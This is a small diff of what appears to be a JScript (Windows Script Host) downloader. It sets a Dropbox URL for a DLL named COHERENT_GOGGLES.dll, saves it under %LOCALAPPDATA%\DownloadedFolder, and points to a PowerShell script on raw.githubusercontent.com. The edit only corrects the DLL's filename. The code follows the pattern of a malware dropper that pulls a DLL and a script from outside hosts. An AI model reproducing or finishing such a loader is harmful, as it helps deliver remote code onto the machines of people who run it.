@@ -5,7 +5,7 @@ try {
 
     // Define URL and target file path for the DLL
     var dllUrl = "https://www.dropbox.com/scl/fi/g6zc6u29hv29mjfmncwka/COHERENT_GOGGLES.dll?rlkey=w667j1ar8o9gdjinpo48xvhfx&st=m6d0ezpb&dl=1";
-    var targetDll = objShell.ExpandEnvironmentStrings("%LOCALAPPDATA%\\DownloadedFolder\\COHERENT_GOOGLES.dll");
+    var targetDll = objShell.ExpandEnvironmentStrings("%LOCALAPPDATA%\\DownloadedFolder\\COHERENT_GOGGLES.dll");
 
     // Define URL and target file path for the PowerShell script
     var psUrl = "https://raw.githubusercontent.com/Scriptjunkie1/zzzzz/main/psscript.ps1"; // Replace with the actual URL
